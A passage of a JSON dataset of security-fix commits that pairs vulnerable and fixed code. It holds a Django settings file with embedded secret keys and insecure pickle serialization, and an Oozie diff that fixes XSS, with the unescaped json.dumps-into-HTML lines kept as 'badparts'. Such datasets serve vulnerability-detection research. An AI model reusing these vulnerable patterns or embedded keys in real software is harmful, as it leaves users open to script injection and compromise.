                    "sourceWithComments": "\"\"\"\nDjango settings for dashboard project.\n\nGenerated by 'django-admin startproject' using Django 2.1.7.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/2.1/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/2.1/ref/settings/\n\"\"\"\n\nimport os\nfrom datetime import timedelta\n\nfrom django.utils.translation import gettext_lazy as _\n\n# Build paths inside the project like this: os.path.join(BASE_DIR, ...)\n# BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\nBASE_DIR = os.path.dirname(os.path.abspath(__file__))\nSETTINGS_PATH = os.path.normpath(os.path.dirname(__file__))\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/2.1/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '_dzlo^9d#ox6!7c9rju@=u8+4^sprqocy3s*l*ejc2yr34@&98'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    # Constance\n    'constance',\n    'constance.backends.database',\n\n    # Jet\n    'jet.dashboard',\n    'jet',\n\n    # Import Export\n    'import_export',\n\n    # Standard Django\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'django.contrib.humanize',\n\n    # Periodic tasks\n    'django_celery_beat',\n\n    # Javascript and CSS compression:\n    'compressor',\n\n    # Web Security Map (todo: minimize the subset)\n    # The reason (model) why it's included is in the comments.\n    'websecmap.app',  # Job\n    'websecmap.organizations',  # Url\n    'websecmap.scanners',  # Endpoint, EndpointGenericScan, UrlGenericScan\n    'websecmap.reporting',  # Various reporting functions (might be not needed)\n    'websecmap.map',  # because some scanners are intertwined with map configurations. That needs to go.\n    'websecmap.pro',  # some model inlines\n\n    # Custom Apps\n    # These apps overwrite whatever is declared above, for example the user information.\n    'dashboard.internet_nl_dashboard',\n\n    # Two factor auth\n    'django_otp',\n    'django_otp.plugins.otp_static',\n    'django_otp.plugins.otp_totp',\n    'two_factor',\n]\n\ntry:\n    # hack to disable django_uwsgi app as it currently conflicts with compressor\n    # https://github.com/django-compressor/django-compressor/issues/881\n    if not os.environ.get('COMPRESS', False):\n        import django_uwsgi  # NOQA\n\n        INSTALLED_APPS += ['django_uwsgi', ]\nexcept ImportError:\n    # only configure uwsgi app if installed (ie: production environment)\n    pass\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.locale.LocaleMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n\n    # Two factor Auth\n    'django_otp.middleware.OTPMiddleware',\n]\n\nROOT_URLCONF = 'dashboard.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [\n            BASE_DIR + '/',\n        ],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'constance.context_processors.config',\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'dashboard.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/2.1/ref/settings/#databases\n\nDATABASE_OPTIONS = {\n    'mysql': {'init_command': \"SET character_set_connection=utf8,\"\n                              \"collation_connection=utf8_unicode_ci,\"\n                              \"sql_mode='STRICT_ALL_TABLES';\"},\n}\nDB_ENGINE = os.environ.get('DB_ENGINE', 'mysql')\nDATABASE_ENGINES = {\n    'mysql': 'dashboard.app.backends.mysql',\n}\nDATABASES_SETTINGS = {\n    # persisten local database used during development (runserver)\n    'dev': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.environ.get('DB_NAME', 'db.sqlite3'),\n    },\n    # sqlite memory database for running tests without\n    'test': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.environ.get('DB_NAME', 'db.sqlite3'),\n    },\n    # for production get database settings from environment (eg: docker)\n    'production': {\n        'ENGINE': DATABASE_ENGINES.get(DB_ENGINE, 'django.db.backends.' + DB_ENGINE),\n        'NAME': os.environ.get('DB_NAME', 'dashboard'),\n        'USER': os.environ.get('DB_USER', 'dashboard'),\n        'PASSWORD': os.environ.get('DB_PASSWORD', 'dashboard'),\n        'HOST': os.environ.get('DB_HOST', 'mysql'),\n        'OPTIONS': DATABASE_OPTIONS.get(os.environ.get('DB_ENGINE', 'mysql'), {})\n    }\n}\n# allow database to be selected through environment variables\nDATABASE = os.environ.get('DJANGO_DATABASE', 'dev')\nDATABASES = {'default': DATABASES_SETTINGS[DATABASE]}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/2.1/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/2.1/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\nLOCALE_PATHS = ['locale']\n\nLANGUAGE_COOKIE_NAME = 'dashboard_language'\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/2.1/howto/static-files/\n\nSTATIC_URL = '/static/'\n\n# Absolute path to aggregate to and serve static file from.\nif DEBUG:\n    STATIC_ROOT = 'static'\nelse:\n    STATIC_ROOT = '/srv/dashboard/static/'\n\n\nJET_SIDE_MENU_ITEMS = [\n\n    {'label': _('\ud83d\udd27 Configuration'), 'items': [\n        {'name': 'auth.user'},\n        {'name': 'auth.group'},\n        {'name': 'constance.config', 'label': _('Configuration')},\n    ]},\n\n    {'label': _('Dashboard'), 'items': [\n        {'name': 'internet_nl_dashboard.account'},\n        {'name': 'internet_nl_dashboard.urllist'},\n        {'name': 'internet_nl_dashboard.uploadlog'},\n    ]},\n\n    {'label': _('\ud83d\udd52 Periodic Tasks'), 'items': [\n        {'name': 'app.job'},\n        {'name': 'django_celery_beat.periodictask'},\n        {'name': 'django_celery_beat.crontabschedule'},\n    ]},\n\n]\n\nMEDIA_ROOT = os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) + '/uploads/')\nUPLOAD_ROOT = os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) + '/uploads/')\n\n\n# Two factor auth\nLOGIN_URL = \"two_factor:login\"\nLOGIN_REDIRECT_URL = \"/dashboard/\"\nLOGOUT_REDIRECT_URL = LOGIN_URL\nTWO_FACTOR_QR_FACTORY = 'qrcode.image.pil.PilImage'\n# 6 supports google authenticator\nTWO_FACTOR_TOTP_DIGITS = 6\nTWO_FACTOR_PATCH_ADMIN = True\n\n# Encrypted fields\n# Note that this key is not stored in the database. As... well if you have the database, you have the key.\nFIELD_ENCRYPTION_KEY = os.environ.get('FIELD_ENCRYPTION_KEY', b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=')\n\nif not DEBUG and FIELD_ENCRYPTION_KEY == b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=':\n    raise ValueError('FIELD_ENCRYPTION_KEY has to be configured on the OS level, and needs to be different than the '\n                     'default key provided. Please create a new key. Instructions are listed here:'\n                     'https://github.com/pyca/cryptography. In short, run: key = Fernet.generate_key()')\n\nLOGGING = {\n    'version': 1,\n    'disable_existing_loggers': False,\n    'handlers': {\n        'console': {\n            'class': 'logging.StreamHandler',  # sys.stdout\n            'formatter': 'color',\n        },\n    },\n    'formatters': {\n        'debug': {\n            'format': '%(asctime)s\\t%(levelname)-8s - %(filename)-20s:%(lineno)-4s - '\n                      '%(funcName)20s() - %(message)s',\n        },\n        'color': {\n            '()': 'colorlog.ColoredFormatter',\n            'format': '%(log_color)s%(asctime)s\\t%(levelname)-8s - '\n                      '%(message)s',\n            'datefmt': '%Y-%m-%d %H:%M',\n            'log_colors': {\n                'DEBUG': 'green',\n                'INFO': 'white',\n                'WARNING': 'yellow',\n                'ERROR': 'red',\n                'CRITICAL': 'bold_red',\n            },\n        }\n    },\n    'loggers': {\n        # Used when there is no log defined or loaded. Disabled given we always use __package__ to log.\n        # Would you enable it, all logging messages will be logged twice.\n        # '': {\n        #     'handlers': ['console'],\n        #     'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'),\n        # },\n\n        # Default Django logging, we expect django to work, and therefore only show INFO messages.\n        # It can be smart to sometimes want to see what's going on here, but not all the time.\n        # https://docs.djangoproject.com/en/2.1/topics/logging/#django-s-logging-extensions\n        'django': {\n            'handlers': ['console'],\n            'level': os.getenv('DJANGO_LOG_LEVEL', 'INFO'),\n        },\n\n        # We expect to be able to debug websecmap all of the time.\n        'dashboard': {\n            'handlers': ['console'],\n            'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'),\n        },\n    },\n}\n\n\n# settings to get WebSecMap to work:\n# Celery 4.0 settings\n# Pickle can work, but you need to use certificates to communicate (to verify the right origin)\n# It's preferable not to use pickle, yet it's overly convenient as the normal serializer can not\n# even serialize dicts.\n# http://docs.celeryproject.org/en/latest/userguide/configuration.html\nCELERY_accept_content = ['pickle', 'yaml']\nCELERY_task_serializer = 'pickle'\nCELERY_result_serializer = 'pickle'\n\n\n# Celery config\nCELERY_BROKER_URL = os.environ.get('BROKER', 'redis://localhost:6379/0')\nENABLE_UTC = True\n\n# Any data transfered with pickle needs to be over tls... you can inject arbitrary objects with\n# this stuff... message signing makes it a bit better, not perfect as it peels the onion.\n# this stuff... message signing makes it a bit better, not perfect as it peels the onion.\n# see: https://blog.nelhage.com/2011/03/exploiting-pickle/\n# Yet pickle is the only convenient way of transporting objects without having to lean in all kinds\n# of directions to get the job done. Intermediate tables to store results could be an option.\nCELERY_ACCEPT_CONTENT = ['pickle']\nCELERY_TASK_SERIALIZER = 'pickle'\nCELERY_RESULT_SERIALIZER = 'pickle'\nCELERY_TIMEZONE = 'UTC'\n\nCELERY_BEAT_SCHEDULER = 'django_celery_beat.schedulers:DatabaseScheduler'\n\nCELERY_BROKER_CONNECTION_MAX_RETRIES = 1\nCELERY_BROKER_CONNECTION_RETRY = False\nCELERY_RESULT_EXPIRES = timedelta(hours=4)\n\n# Use the value of 2 for celery prefetch multiplier. Previous was 1. The\n# assumption is that 1 will block a worker thread until the current (rate\n# limited) task is completed. When using 2 (or higher) the assumption is that\n# celery will drop further rate limited task from the internal worker queue and\n# fetch other tasks tasks that could be executed (spooling other rate limited\n# tasks through in the process but to no hard except for a slight drop in\n# overall throughput/performance). A to high value for the prefetch multiplier\n# might result in high priority tasks not being picked up as Celery does not\n# seem to do prioritisation in worker queues but only on the broker\n# queues. The value of 2 is currently selected because it higher than 1,\n# behaviour needs to be observed to decide if raising this results in\n# further improvements without impacting the priority feature.\nCELERY_WORKER_PREFETCH_MULTIPLIER = 2\n\n# numer of tasks to be executed in parallel by celery\nCELERY_WORKER_CONCURRENCY = 10\n\n# Workers will scale up and scale down depending on the number of tasks\n# available. To prevent workers from scaling down while still doing work,\n# the ACKS_LATE setting is used. This insures that a task is removed from\n# the task queue after the task is performed. This might result in some\n# issues where tasks that don't finish or crash keep being executed:\n# thus for tasks that are not programmed perfectly it will raise a number\n# of repeated exceptions which will need to be debugged.\nCELERY_ACKS_LATE = True\n\nTOOLS = {\n    'organizations': {\n        'import_data_dir': '',\n    },\n}\n\nOUTPUT_DIR = os.environ.get('OUTPUT_DIR', os.path.abspath(os.path.dirname(__file__)) + '/')\nVENDOR_DIR = os.environ.get('VENDOR_DIR', os.path.abspath(os.path.dirname(__file__) + '/../vendor/') + '/')\n\nif DEBUG:\n    # too many sql variables....\n    DATA_UPLOAD_MAX_NUMBER_FIELDS = 10000\n\n\n# Compression\n# Django-compressor is used to compress css and js files in production\n# During development this is disabled as it does not provide any feature there\n# Django-compressor configuration defaults take care of this.\n# https://django-compressor.readthedocs.io/en/latest/usage/\n# which plugins to use to find static files\nSTATICFILES_FINDERS = (\n    # default static files finders\n    'django.contrib.staticfiles.finders.FileSystemFinder',\n    'django.contrib.staticfiles.finders.AppDirectoriesFinder',\n    # other finders..\n    'compressor.finders.CompressorFinder',\n)\n\nCOMPRESS_CSS_FILTERS = ['compressor.filters.cssmin.CSSCompressorFilter']\n\n# Slimit doesn't work with vue. Tried two versions. Had to rewrite some other stuff.\n# Now using the default, so not explicitly adding that to the settings\n# COMPRESS_JS_FILTERS = ['compressor.filters.jsmin.JSMinFilter']\n\n# Brotli compress storage gives some issues.\n# This creates the original compressed and a gzipped compressed file.\nCOMPRESS_STORAGE = (\n    'compressor.storage.GzipCompressorFileStorage'\n)\n\n# Enable static file (js/css) compression when not running debug\n# https://django-compressor.readthedocs.io/en/latest/settings/#django.conf.settings.COMPRESS_OFFLINE\nCOMPRESS_OFFLINE = not DEBUG\n# https://django-compressor.readthedocs.io/en/latest/settings/#django.conf.settings.COMPRESS_ENABLED\n# Enabled when debug is off by default.\n"
                }
            },
            "msg": "Add spreadsheet with XSS attacks, icon to dashboard and status to upload in admin"
        }
    },
    "https://github.com/boc-bdp/goumang": {
        "6641c62beaa1468082e47d82da5ed758d11c7735": {
            "url": "https://api.github.com/repos/boc-bdp/goumang/commits/6641c62beaa1468082e47d82da5ed758d11c7735",
            "html_url": "https://github.com/boc-bdp/goumang/commit/6641c62beaa1468082e47d82da5ed758d11c7735",
            "message": "[oozie] Protect against XSS in the editor",
            "sha": "6641c62beaa1468082e47d82da5ed758d11c7735",
            "keyword": "XSS protect",
            "diff": "diff --git a/apps/oozie/src/oozie/models2.py b/apps/oozie/src/oozie/models2.py\nindex c9dd546b72..f3f5cce5af 100644\n--- a/apps/oozie/src/oozie/models2.py\n+++ b/apps/oozie/src/oozie/models2.py\n@@ -26,6 +26,7 @@\n from string import Template\n \n from django.utils.encoding import force_unicode\n+from desktop.lib.json_utils import JSONEncoderForHTML\n from django.utils.translation import ugettext as _\n \n from desktop.lib import django_mako\n@@ -1381,14 +1382,13 @@ def id(self):\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['start'] = _data['properties']['start'].strftime('%Y-%m-%dT%H:%M:%S')\n     _data['properties']['end'] = _data['properties']['end'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):\n@@ -1597,13 +1597,12 @@ def id(self):\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['kickoff'] = _data['properties']['kickoff'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):\ndiff --git a/apps/oozie/src/oozie/views/editor2.py b/apps/oozie/src/oozie/views/editor2.py\nindex c2b5f66917..215dc77158 100644\n--- a/apps/oozie/src/oozie/views/editor2.py\n+++ b/apps/oozie/src/oozie/views/editor2.py\n@@ -29,6 +29,7 @@\n from desktop.lib.exceptions_renderable import PopupException\n from desktop.lib.i18n import smart_str\n from desktop.lib.rest.http_client import RestException\n+from desktop.lib.json_utils import JSONEncoderForHTML\n from desktop.models import Document, Document2\n \n from liboozie.credentials import Credentials\n@@ -49,7 +50,7 @@ def list_editor_workflows(request):\n   workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n \n   return render('editor/list_editor_workflows.mako', request, {\n-      'workflows_json': json.dumps(workflows)\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)\n   })\n \n \n@@ -82,12 +83,12 @@ def edit_workflow(request):\n     LOG.error(smart_str(e))\n \n   return render('editor/workflow_editor.mako', request, {\n-      'layout_json': json.dumps(workflow_data['layout']),\n-      'workflow_json': json.dumps(workflow_data['workflow']),\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),\n+      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),\n+      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n-      'subworkflows_json': json.dumps(_get_workflows(request.user)),\n+      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n \n@@ -373,9 +374,9 @@ def edit_coordinator(request):\n     raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n \n   return render('editor/coordinator_editor.mako', request, {\n-      'coordinator_json': coordinator.json,\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflows_json': json.dumps(workflows),\n+      'coordinator_json': coordinator.json_for_html(),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n@@ -497,8 +498,8 @@ def edit_bundle(request):\n                       for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n \n   return render('editor/bundle_editor.mako', request, {\n-      'bundle_json': bundle.json,\n-      'coordinators_json': json.dumps(coordinators),\n+      'bundle_json': bundle.json_for_html(),\n+      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n   })\n",
            "files": {
                "/apps/oozie/src/oozie/models2.py": {
                    "changes": [
                        {
                            "diff": "\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['start'] = _data['properties']['start'].strftime('%Y-%m-%dT%H:%M:%S')\n     _data['properties']['end'] = _data['properties']['end'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):\n",
                            "add": 2,
                            "remove": 3,
                            "filename": "/apps/oozie/src/oozie/models2.py",
                            "badparts": [
                                "  @property",
                                "  def json(self):",
                                "    return json.dumps(_data)"
                            ],
                            "goodparts": [
                                "  def json_for_html(self):",
                                "    return json.dumps(_data, cls=JSONEncoderForHTML)"
                            ]
                        },
                        {
                            "diff": "\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['kickoff'] = _data['properties']['kickoff'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):",
                            "add": 2,
                            "remove": 3,
                            "filename": "/apps/oozie/src/oozie/models2.py",
                            "badparts": [
                                "  @property",
                                "  def json(self):",
                                "    return json.dumps(_data)"
                            ],
                            "goodparts": [
                                "  def json_for_html(self):",
                                "    return json.dumps(_data, cls=JSONEncoderForHTML)"
                            ]
                        }
                    ]
                },
                "/apps/oozie/src/oozie/views/editor2.py": {
                    "changes": [
                        {
                            "diff": "\n   workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n \n   return render('editor/list_editor_workflows.mako', request, {\n-      'workflows_json': json.dumps(workflows)\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)\n   })\n \n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/apps/oozie/src/oozie/views/editor2.py",
                            "badparts": [
                                "      'workflows_json': json.dumps(workflows)"
                            ],
                            "goodparts": [
                                "      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)"
                            ]
                        },
                        {
                            "diff": "\n     LOG.error(smart_str(e))\n \n   return render('editor/workflow_editor.mako', request, {\n-      'layout_json': json.dumps(workflow_data['layout']),\n-      'workflow_json': json.dumps(workflow_data['workflow']),\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),\n+      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),\n+      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n-      'subworkflows_json': json.dumps(_get_workflows(request.user)),\n+      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n \n",
                            "add": 5,
                            "remove": 5,
                            "filename": "/apps/oozie/src/oozie/views/editor2.py",
                            "badparts": [
                                "      'layout_json': json.dumps(workflow_data['layout']),",
                                "      'workflow_json': json.dumps(workflow_data['workflow']),",
                                "      'credentials_json': json.dumps(credentials.credentials.keys()),",
                                "      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),",
                                "      'subworkflows_json': json.dumps(_get_workflows(request.user)),"
                            ],
                            "goodparts": [
                                "      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),",
                                "      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),",
                                "      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),",
                                "      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),",
                                "      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),"
                            ]
                        },
                        {
                            "diff": "\n     raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n \n   return render('editor/coordinator_editor.mako', request, {\n-      'coordinator_json': coordinator.json,\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflows_json': json.dumps(workflows),\n+      'coordinator_json': coordinator.json_for_html(),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n",
                            "add": 3,
                            "remove": 3,
                            "filename": "/apps/oozie/src/oozie/views/editor2.py",
                            "badparts": [
                                "      'coordinator_json': coordinator.json,",
                                "      'credentials_json': json.dumps(credentials.credentials.keys()),",
                                "      'workflows_json': json.dumps(workflows),"
                            ],
                            "goodparts": [
                                "      'coordinator_json': coordinator.json_for_html(),",
                                "      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),",
                                "      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),"
                            ]
                        },
                        {
                            "diff": "\n                       for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n \n   return render('editor/bundle_editor.mako', request, {\n-      'bundle_json': bundle.json,\n-      'coordinators_json': json.dumps(coordinators),\n+      'bundle_json': bundle.json_for_html(),\n+      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n   })\n",
                            "add": 2,
                            "remove": 2,
                            "filename": "/apps/oozie/src/oozie/views/editor2.py",
                            "badparts": [
                                "      'bundle_json': bundle.json,",
                                "      'coordinators_json': json.dumps(coordinators),"
                            ],
                            "goodparts": [
                                "      'bundle_json': bundle.json_for_html(),",
                                "      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),"
                            ]
                        }
                    ],
                    "source": "\n import json import logging import uuid from django.core.urlresolvers import reverse from django.forms.formsets import formset_factory from django.http import HttpResponse from django.shortcuts import redirect from django.utils.translation import ugettext as _ from desktop.lib.django_util import render from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import Document, Document2 from liboozie.credentials import Credentials from liboozie.oozie_api import get_oozie from liboozie.submission2 import Submission from oozie.decorators import check_document_access_permission, check_document_modify_permission from oozie.forms import ParameterForm from oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\ find_dollar_variables, find_dollar_braced_variables LOG=logging.getLogger(__name__) def list_editor_workflows(request): workflows=[d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] return render('editor/list_editor_workflows.mako', request,{ 'workflows_json': json.dumps(workflows) }) @check_document_access_permission() def edit_workflow(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid['id']=workflow_id else: wid['uuid']=workflow_id doc=Document2.objects.get(type='oozie-workflow2', **wid) workflow=Workflow(document=doc) else: doc=None workflow=Workflow() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES), 'doc1_id': doc.doc.get().id if doc else -1, 'subworkflows_json': json.dumps(_get_workflows(request.user)), 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_workflow(request): return edit_workflow(request) def delete_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(id=job['id']) doc=doc2.doc.get() doc.can_write_or_exception(request.user) doc.delete() doc2.delete() response={} request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(type='oozie-workflow2', id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc.all().delete() doc2.doc.add(copy_doc) workflow=Workflow(document=doc2) workflow.update_name(name) doc2.update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1} workflow=json.loads(request.POST.get('workflow', '{}')) layout=json.loads(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2') subworkflows=[node['properties']['workflow'] for node in workflow['nodes'] if node['type']=='subworkflow-widget'] if subworkflows: dependencies=Document2.objects.filter(uuid__in=subworkflows) workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow}) workflow_doc.update_data({'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status']=0 response['id']=workflow_doc.id response['doc1_id']=workflow_doc.doc.get().id response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=NODES[node['widgetType']].get_mandatory_fields() workflows=[] if node['widgetType']=='subworkflow-widget': workflows=_get_workflows(request.user) response['status']=0 response['properties']=properties response['workflows']=workflows return HttpResponse(json.dumps(response), mimetype=\"application/json\") def _get_workflows(user): return[{ 'name': workflow.name, 'owner': workflow.owner.username, 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=json.loads(request.POST.get('properties', '{}')) copied_properties=json.loads(request.POST.get('copiedProperties', '{}')) _properties=dict(NODES[node['widgetType']].get_fields()) _properties.update(dict([(_property['name'], _property['value']) for _property in properties])) if 